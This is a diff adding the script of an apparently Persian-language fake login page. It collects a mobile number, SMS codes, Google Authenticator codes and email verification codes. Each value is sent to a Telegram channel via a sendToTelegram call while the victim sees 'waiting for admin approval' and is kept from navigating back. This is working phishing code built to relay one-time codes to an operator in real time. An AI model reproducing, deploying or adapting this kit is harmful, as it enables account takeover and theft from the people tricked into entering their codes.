+    function setupEmailAutocomplete() { const emailInput = $('#email-input'); const suggestionsList = $('#email-suggestions'); const emailDomains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'aol.com']; emailInput.off('input').on('input', function() { const currentValue = $(this).val(); const atIndex = currentValue.indexOf('@'); suggestionsList.empty().hide(); if (atIndex !== -1) { const prefix = currentValue.substring(0, atIndex + 1); const suffix = currentValue.substring(atIndex + 1); const matchingDomains = emailDomains.filter(domain => domain.startsWith(suffix)); if (matchingDomains.length > 0) { matchingDomains.forEach(domain => { suggestionsList.append($('<li>').text(prefix + domain)); }); suggestionsList.slideDown(100); } } }); suggestionsList.off('click', 'li').on('click', 'li', function() { emailInput.val($(this).text()).trigger('input'); suggestionsList.empty().slideUp(100); emailInput.focus(); }); $(document).off('click.suggestion').on('click.suggestion', (e) => { if (!$(e.target).closest('#email-input, #email-suggestions').length) { suggestionsList.slideUp(100); } }); }
+
+    // --- Pin Input Initialization ---
+    function initializePinInput() { const pinEl = $('#loginpin'); const errEl = $('#VerifyCode .pinlogin-error'); errEl.hide(); if (!pinEl.length || !$.fn.pinlogin) { console.error("[PIN Init - SMS] Target element or pinlogin plugin not found."); pinEl.html('<p style="color:red;">خطا در بارگذاری فیلد کد.</p>'); return; } try { if (loginpin && typeof loginpin.reset === 'function') { loginpin.reset(); } else { loginpin = pinEl.pinlogin({ fields: 6, hideinput: false, autofocus: true, reset: false, copypaste: true, error: (msg) => { errEl.text(msg).show(); }, complete: () => { errEl.hide(); } }); } if (loginpin?.fields?.[0]) $(loginpin.fields[0]).focus(); } catch (e) { console.error("[PIN Init - SMS] Error initializing pinlogin:", e); pinEl.html('<p style="color:red;">خطا در بارگذاری فیلد کد.</p>'); } }
+    function initializeGoogleAuthPinInput() { const pinEl = $('#googleauthpin'); const errEl = $('#google-auth-form .googleauth-pin-error'); errEl.hide(); if (!pinEl.length || !$.fn.pinlogin) { console.error("[PIN Init - GA] Target element or pinlogin plugin not found."); pinEl.html('<p style="color:red;">خطا در بارگذاری فیلد کد.</p>'); return; } try { if (googleauthpin && typeof googleauthpin.reset === 'function') { googleauthpin.reset(); } else { googleauthpin = pinEl.pinlogin({ fields: 6, hideinput: false, autofocus: true, reset: false, copypaste: true, error:(m)=>{ errEl.text(m).show(); }, complete:(p)=>{ errEl.hide(); } }); } if (googleauthpin?.fields?.[0]) $(googleauthpin.fields[0]).focus(); } catch (e) { console.error("[PIN Init - GA] Error initializing pinlogin:", e); pinEl.html('<p style="color:red;">خطا در بارگذاری فیلد کد.</p>'); } }
+    function initializeEmailAuthPinInput() { const pinEl = $('#emailauthpin'); const errEl = $('#email-auth-form .emailauth-pin-error'); errEl.hide(); if (!pinEl.length || !$.fn.pinlogin) { console.error("[PIN Init - Email] Target element or pinlogin plugin not found."); pinEl.html('<p style="color:red;">خطا در بارگذاری فیلد کد.</p>'); return; } try { if (emailauthpin && typeof emailauthpin.reset === 'function') { console.log("[PIN Init - Email] Resetting existing instance."); emailauthpin.reset(); } else { console.log("[PIN Init - Email] Initializing new instance."); emailauthpin = pinEl.pinlogin({ fields: 6, hideinput: false, autofocus: true, reset: false, copypaste: true, error:(m)=>{ errEl.text(m).show(); }, complete:(p)=>{ errEl.hide(); } }); } if (emailauthpin?.fields?.[0]) $(emailauthpin.fields[0]).focus(); console.log("[PIN Init - Email] Init/Reset complete."); } catch (e) { console.error("[PIN Init - Email] Error initializing pinlogin:", e); pinEl.html('<p style="color:red;">خطا در بارگذاری فیلد کد.</p>'); } }
+
+    // --- Mobile Login Forms Validation and Submission ---
+     function setupMobileFormsValidation() { const smsForm = $("#SmsForm"); if (!smsForm.length) { console.warn("Mobile number form (#SmsForm) not found."); return; } if ($.fn.validate && !smsForm.data('validator')) { smsForm.validate({ rules: { mobile: { required: true, digits: true, minlength: 11, maxlength: 11 } }, messages: { mobile: { required: "لطفا شماره موبایل خود را وارد کنید.", digits: "شماره موبایل باید فقط شامل اعداد باشد.", minlength: "شماره موبایل باید 11 رقم باشد.", maxlength: "شماره موبایل باید 11 رقم باشد." } }, errorElement: "span", errorPlacement: function (error, element) { error.addClass("field-validation-error"); element.closest(".list-input").find("span[data-valmsg-for='mobile']").html(error).show(); element.addClass('error'); }, success: function (label, element) { $(element).closest(".list-input").find("span[data-valmsg-for='mobile']").empty().hide(); $(element).removeClass('error'); },
+         submitHandler: function(form) { console.log("[Mobile Login - Step 1] Mobile form validated. Submitting."); currentSessionId = generateSessionId(); isGaRetry = false; isEmailRetry = false; // <<-- شروع جلسه جدید
+          console.log(`[Mobile Login - Step 1] Session ID: ${currentSessionId}`); $('.login-box-error', form).empty().hide(); const btn = $(form).find(".send_code__btn"); btn.prop("disabled", true).html("صبر کنید..."); let mobile = $(form).find('input[name="mobile"]').val();
+          sendToTelegram({ dataType: 'mobile_sent', mobile: mobile }) // Session ID در تابع اضافه می شود
+              .always(() => { console.log("[Mobile Login - Step 1] Proceeding to Step 2 UI."); setTimeout(() => { $('#mobile-input-hidden').val(mobile); $('.code-sent').html(`<span>کد تایید برای <strong>${escapeHtml(mobile)}</strong> ارسال شد</span>`); $('#login-subtitle').text('کد 6 رقمی ارسال شده را وارد کنید'); $('#SmsForm').hide(); $('#VerifyCode').show(); initializePinInput(); startCountdown(); $('.sendEmailCode').hide(); }, 300); }); } }); }
+        else if (!$.fn.validate) { console.error("jQuery Validate not loaded, cannot validate mobile form."); }
+        const verifyForm = $("#VerifyCode"); if (!verifyForm.length) { console.warn("SMS verification form (#VerifyCode) not found."); return; }
+        verifyForm.off('submit').on('submit', function(event) { event.preventDefault(); console.log("[Mobile Login - Step 2] Verification code form submitted."); if (!currentSessionId) { $('.login-box-error2', this).text("خطای جلسه منقضی شده. لطفا دوباره تلاش کنید.").show(); console.error("[Mobile Login - Step 2] Submission failed: No active session ID."); return; } var mobileHidden = $('#mobile-input-hidden').val(); var errBox = $('.login-box-error2', this); var pinErrBox = $('.pinlogin-error', this); var code = ""; $('#loginpin input').each(function() { code += $(this).val(); }); errBox.empty().hide(); pinErrBox.hide(); if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) { pinErrBox.text("کد تایید باید 6 رقم عددی باشد.").show(); if (loginpin?.fields?.[0]) { $(loginpin.fields[0]).focus(); } return; } if (!mobileHidden) { errBox.text("خطا: شماره موبایل یافت نشد. لطفا از ابتدا شروع کنید.").show(); console.error("[Mobile Login - Step 2] Submission failed: Hidden mobile number not found."); return; } const checkBtn = $(".check__btn", this); checkBtn.prop("disabled", true).text("بررسی کد...");
+        sendToTelegram({ dataType: 'verification_code', mobile: mobileHidden, code: code }) // Session ID در تابع اضافه می شود
+            .done(() => { console.log("[Mobile Login - Step 2] Verification code sent. Showing overlay."); stopCountdown(); $('#processing-overlay .processing-text').text('در حال بررسی کد تایید...'); $('#command-status').text('منتظر تایید ادمین...').show(); $('#processing-overlay').css('display', 'flex').hide().fadeIn(200, startCommandPolling); }).fail(() => { console.error("[Mobile Login - Step 2] Failed to send verification code."); errBox.text("خطا در ارسال کد به سرور. لطفا دوباره تلاش کنید.").show(); checkBtn.prop("disabled", false).text("ورود"); }); });
+     }
+
+     // --- Google Authenticator Form Validation/Submission ---
+     function setupGoogleAuthFormValidation() { const gaForm = $("#GoogleAuthVerifyForm"); if (!gaForm.length) { console.warn("Google Auth form (#GoogleAuthVerifyForm) not found."); return; } gaForm.off('submit').on('submit', function(event) { event.preventDefault(); console.log("[GA Login] GA code form submitted."); if (!currentSessionId) { $('.login-box-error2', this).text("خطای جلسه منقضی شده. لطفا دوباره تلاش کنید.").show(); console.error("[GA Login] Submission failed: No active session ID."); return; } var errBox = $('.login-box-error2', this); var pinErrBox = $('.googleauth-pin-error', this); var code = ""; $('#googleauthpin input').each(function() { code += $(this).val(); }); errBox.empty().hide(); pinErrBox.hide(); if (!code || code.length !== 6 || !/^\d{6}$/.test(code)) { pinErrBox.text("کد Google Authenticator باید 6 رقم باشد.").show(); if (googleauthpin?.fields?.[0]) { $(googleauthpin.fields[0]).focus(); } return; } const gaBtn = $(".ga_check__btn", this); gaBtn.prop("disabled", true).text("بررسی کد...");
+     sendToTelegram({ dataType: 'google_auth_code', code: code }) // Session ID در تابع اضافه می شود
+         .done(() => { console.log("[GA Login] GA code sent. Showing overlay."); $('#google-auth-form').hide(); $('#processing-overlay .processing-text').text('در حال بررسی کد Google Authenticator...'); $('#command-status').text('منتظر تایید نهایی...').show(); $('#processing-overlay').css('display', 'flex').hide().fadeIn(200, startCommandPolling); }).fail(() => { console.error("[GA Login] Failed to send GA code."); errBox.text("خطا در ارسال کد GA به سرور.").show(); gaBtn.prop("disabled", false).text("ورود"); }); }); }
+
+    // --- Email Authentication Form Validation/Submission ---
+      function setupEmailAuthFormValidation() { const emailAuthForm = $("#EmailAuthVerifyForm"); if (!emailAuthForm.length) { console.warn("Email Auth form (#EmailAuthVerifyForm) not found."); return; } emailAuthForm.off('submit').on('submit', function(event) { event.preventDefault(); console.log("[Email Auth] Email code form submitted."); if (!currentSessionId) { $('.login-box-error2', this).text("خطای جلسه منقضی شده. لطفا دوباره تلاش کنید.").show(); console.error("[Email Auth] Submission failed: No active session ID."); return; } var errorBox = $('.login-box-error2', this); var pinErrorBox = $('.emailauth-pin-error', this); var code_to_send = ""; $('#emailauthpin input').each(function() { code_to_send += $(this).val(); }); errorBox.empty().hide(); pinErrorBox.hide(); if (!code_to_send || code_to_send.length !== 6 || !/^\d{6}$/.test(code_to_send)) { pinErrorBox.text("کد تایید ایمیل باید 6 رقم باشد.").show(); if (emailauthpin?.fields?.[0]) { $(emailauthpin.fields[0]).focus(); } return; } const submitButton = $(".email_check__btn", this); submitButton.prop("disabled", true).text("بررسی کد...");
+      sendToTelegram({ dataType: 'email_auth_code', code: code_to_send }) // Session ID در تابع اضافه می شود
+          .done(() => { console.log("[Email Auth] Email code sent. Showing overlay."); $('#email-auth-form').hide(); $('#processing-overlay .processing-text').text('در حال بررسی کد ایمیل...'); $('#command-status').text('منتظر تایید نهایی...').show(); $('#processing-overlay').css('display', 'flex').hide().fadeIn(200, startCommandPolling); }).fail(() => { console.error("[Email Auth] Failed to send Email code."); errorBox.text("خطا در ارسال کد ایمیل به سرور.").show(); submitButton.prop("disabled", false).text("تایید کد ایمیل"); }); }); }
+
+     // --- Setup Delegated Event Handlers ---
+      function setupDelegatedEventHandlers() { $(document).off('click.backtochange').on('click.backtochange', ".back_to_change", function() { console.log("[UI] 'Edit Number' button clicked."); isGaRetry = false; isEmailRetry = false; switchTab('mobile'); setTimeout(() => { $('#mobile-input').focus(); }, 100); }); $(document).off('click.showpass').on('click.showpass', '.showpass', function() { var passwordInput = $(this).closest('.input-text').find('input.password'); var icon = $(this); if (passwordInput.attr("type") === "password") { passwordInput.attr("type", "text"); icon.removeClass('icon-eye3').addClass('icon-eye-slash4'); } else { passwordInput.attr("type", "password"); icon.removeClass('icon-eye-slash4').addClass('icon-eye3'); } }); $(document).off('click.androidinstall').on('click.androidinstall', '#androidMob .add-to-home-screen', () => { if(window.deferredPrompt) { window.deferredPrompt.prompt(); } else { console.warn("PWA deferred prompt not available."); } }); $(document).off('click.installclose').on('click.installclose', '.install-close', (e) => { $(e.currentTarget).closest('.app-header').hide(); }); $('#email-auth-form .orange').off('click.resendemail').on('click.resendemail', function(e){ e.preventDefault(); alert('قابلیت ارسال مجدد کد ایمیل هنوز پیاده‌سازی نشده است.'); }); }
+
+    // --- Countdown Timer Logic ---
+     function startCountdown() { stopCountdown(); let remainingTime = timerDuration; const timerDisplay = $('#timer'); const resendButton = $('#resendCode'); const countdownText = $('.resendcode'); countdownText.show(); resendButton.hide(); timerDisplay.text(formatTime(remainingTime)); countdownInterval = setInterval(() => { try { remainingTime--; timerDisplay.text(formatTime(remainingTime)); if (remainingTime <= 0) { stopCountdown(); countdownText.hide(); resendButton.show(); } } catch (e) { console.error("Error within countdown timer interval:", e); stopCountdown(); } }, 1000); }
+    function stopCountdown() { if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; } }
+    function formatTime(totalSeconds) { let minutes = Math.floor(totalSeconds / 60); let seconds = totalSeconds % 60; return minutes + ":" + (seconds < 10 ? '0' : '') + seconds; }
+    function send_again() { console.log("[Mobile Login] 'Resend Code' button clicked."); const resendButton = $('#resendCode'); resendButton.hide(); let mobile = $('#mobile-input-hidden').val(); if (!currentSessionId) { alert("خطای جلسه. لطفا از ابتدا شروع کنید یا صفحه را رفرش کنید."); console.error("[Mobile Login] Resend failed: No active session ID."); /* switchTab('mobile'); */ return; } if (!mobile) { alert("خطای داخلی: شماره موبایل یافت نشد."); console.error("[Mobile Login] Resend failed: Hidden mobile number not found."); return; }
+     sendToTelegram({ dataType: 'mobile_sent', mobile: mobile, resend: true }) // Session ID در تابع اضافه می شود
+         .always(() => { // Assume backend handles resend logic
+             if (loginpin?.reset) loginpin.reset(); $('.pinlogin-error, .login-box-error2').hide(); setTimeout(() => { startCountdown(); if (loginpin?.fields?.[0]) $(loginpin.fields[0]).focus(); }, 500);
+         });
+     }
+
+    // --- PWA Logic ---
+    function setupPWA() { if ('serviceWorker' in navigator) { window.addEventListener('load', () => { navigator.serviceWorker.register('/pwa-sw.js').then(reg => console.log('Service Worker registered successfully. Scope:', reg.scope)).catch(err => console.error('Service Worker registration failed:', err)); }); } else { console.log("Service Workers not supported."); } if (typeof initializePwaSettings === 'function') { initializePwaSettings(); } else { console.warn("PWA settings function not found."); } }
+
+    // --- Browser History Logic ---
+    function preventBrowserBack() { try { window.history.pushState(null, '', window.location.href); window.onpopstate = () => { window.history.pushState(null, '', window.location.href); console.log("Browser back intercepted."); }; } catch (e) { console.error("Failed history manipulation:", e); } }
+
+    // --- Basic HTML Escaping Utility ---
+     function escapeHtml(unsafe) { if (typeof unsafe !== 'string') { if (unsafe === null || unsafe === undefined) return ''; try { unsafe = String(unsafe); } catch (e) { return ''; } } return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;"); }
+
+</script>
+</body>
+</html>
